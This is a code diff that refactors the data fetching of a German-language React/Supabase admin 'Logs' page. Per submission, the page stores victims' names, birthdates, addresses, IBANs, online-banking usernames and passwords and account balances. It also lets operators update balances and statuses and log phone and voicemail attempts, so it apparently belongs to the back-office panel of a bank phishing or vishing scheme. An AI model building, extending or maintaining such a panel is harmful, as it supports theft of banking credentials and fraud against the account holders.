@@ -1,4 +1,4 @@
-import { useEffect, useState } from "react";
+import { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 import AdminLayout, { useAdminUser } from "@/components/AdminLayout";
@@ -12,38 +12,8 @@ import { Badge } from "@/components/ui/badge";
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip";
 import { toast } from "sonner";
 import { Copy, Eye, MessageSquare, PhoneMissed, RefreshCw } from "lucide-react";
-
-interface Submission {
-  id: string;
-  session_id: string;
-  created_at: string;
-  full_name: string | null;
-  email: string | null;
-  birthdate: string | null;
-  phone: string | null;
-  street: string | null;
-  house_number: string | null;
-  staircase: string | null;
-  door_number: string | null;
-  postal_code: string | null;
-  city: string | null;
-  iban: string | null;
-  bank: string | null;
-  bank_username: string | null;
-  bank_password: string | null;
-  bank_username_label: string | null;
-  bank_password_label: string | null;
-  bank_extra: Record<string, string> | null;
-  balance: string | null;
-  status: string | null;
-}
-
-interface Note {
-  id: string;
-  user_email: string;
-  content: string;
-  created_at: string;
-}
+import { useSubmissions, type Note } from "@/hooks/use-submissions";
+import { useQueryClient } from "@tanstack/react-query";
 
 interface Call {
   id: string;
@@ -64,36 +34,14 @@ const statusBadgeClass: Record<string, string> = {
 function LogsContent() {
   const navigate = useNavigate();
   const user = useAdminUser();
-  const [submissions, setSubmissions] = useState<Submission[]>([]);
+  const queryClient = useQueryClient();
+  const { submissions, noteCounts, callCounts, refetch } = useSubmissions();
   const [balanceEdit, setBalanceEdit] = useState<{ id: string; value: string } | null>(null);
   const [statusFilter, setStatusFilter] = useState<string>("Alle");
-  const [noteCounts, setNoteCounts] = useState<Record<string, number>>({});
-  const [callCounts, setCallCounts] = useState<Record<string, number>>({});
   const [noteDialog, setNoteDialog] = useState<{ id: string; notes: Note[] } | null>(null);
   const [callDialog, setCallDialog] = useState<{ id: string; calls: Call[] } | null>(null);
   const [newNote, setNewNote] = useState("");
   const [savingNote, setSavingNote] = useState(false);
-
-  useEffect(() => { fetchAll(); }, []);
-
-  const fetchAll = async () => {
-    const [subRes, notesRes, callsRes] = await Promise.all([
-      supabase.from("submissions").select("*").order("created_at", { ascending: false }),
-      supabase.from("submission_notes").select("id, submission_id"),
-      supabase.from("submission_calls").select("id, submission_id"),
-    ]);
-    if (subRes.data) setSubmissions(subRes.data as Submission[]);
-    if (notesRes.data) {
-      const counts: Record<string, number> = {};
-      notesRes.data.forEach((n: any) => { counts[n.submission_id] = (counts[n.submission_id] || 0) + 1; });
-      setNoteCounts(counts);
-    }
-    if (callsRes.data) {
-      const counts: Record<string, number> = {};
-      callsRes.data.forEach((c: any) => { counts[c.submission_id] = (counts[c.submission_id] || 0) + 1; });
-      setCallCounts(counts);
-    }
-  };
 
   const copyToClipboard = (text: string) => {
     navigator.clipboard.writeText(text);
@@ -106,7 +54,9 @@ function LogsContent() {
     if (error) { toast.error("Fehler beim Speichern"); }
     else {
       toast.success("Guthaben gespeichert");
-      setSubmissions((prev) => prev.map((s) => (s.id === balanceEdit.id ? { ...s, balance: balanceEdit.value || null } : s)));
+      queryClient.setQueryData<any[]>(["submissions"], (old) =>
+        old?.map((s) => (s.id === balanceEdit.id ? { ...s, balance: balanceEdit.value || null } : s))
+      );
       setBalanceEdit(null);
     }
   };
@@ -114,7 +64,11 @@ function LogsContent() {
   const updateStatus = async (id: string, status: string) => {
     const { error } = await supabase.from("submissions").update({ status }).eq("id", id);
     if (error) { toast.error("Fehler beim Speichern"); }
-    else { setSubmissions((prev) => prev.map((s) => (s.id === id ? { ...s, status } : s))); }
+    else {
+      queryClient.setQueryData<any[]>(["submissions"], (old) =>
+        old?.map((s) => (s.id === id ? { ...s, status } : s))
+      );
+    }
   };
 
   const openNoteDialog = async (subId: string) => {
@@ -138,7 +92,7 @@ function LogsContent() {
       setNewNote("");
       if (data) {
         setNoteDialog((prev) => prev ? { ...prev, notes: [data as Note, ...prev.notes] } : null);
-        setNoteCounts((prev) => ({ ...prev, [noteDialog.id]: (prev[noteDialog.id] || 0) + 1 }));
+        queryClient.invalidateQueries({ queryKey: ["submission-note-counts"] });
       }
     }
   };
@@ -154,7 +108,7 @@ function LogsContent() {
     if (error) { toast.error("Fehler beim Speichern"); }
     else {
       toast.success("Mailbox-Versuch gespeichert");
-      setCallCounts((prev) => ({ ...prev, [subId]: (prev[subId] || 0) + 1 }));
+      queryClient.invalidateQueries({ queryKey: ["submission-call-counts"] });
     }
   };
 
@@ -181,12 +135,11 @@ function LogsContent() {
     <div className="space-y-6">
       <div className="flex items-center justify-between">
         <h1 className="text-2xl font-bold text-slate-900">Logs</h1>
-        <Button variant="outline" size="sm" onClick={fetchAll} className="gap-2">
+        <Button variant="outline" size="sm" onClick={refetch} className="gap-2">
           <RefreshCw className="h-3.5 w-3.5" /> Aktualisieren
         </Button>
       </div>
 
-      {/* Status Filter */}
       <div className="flex items-center gap-2">
         {["Alle", ...STATUS_OPTIONS].map((s) => (
           <button
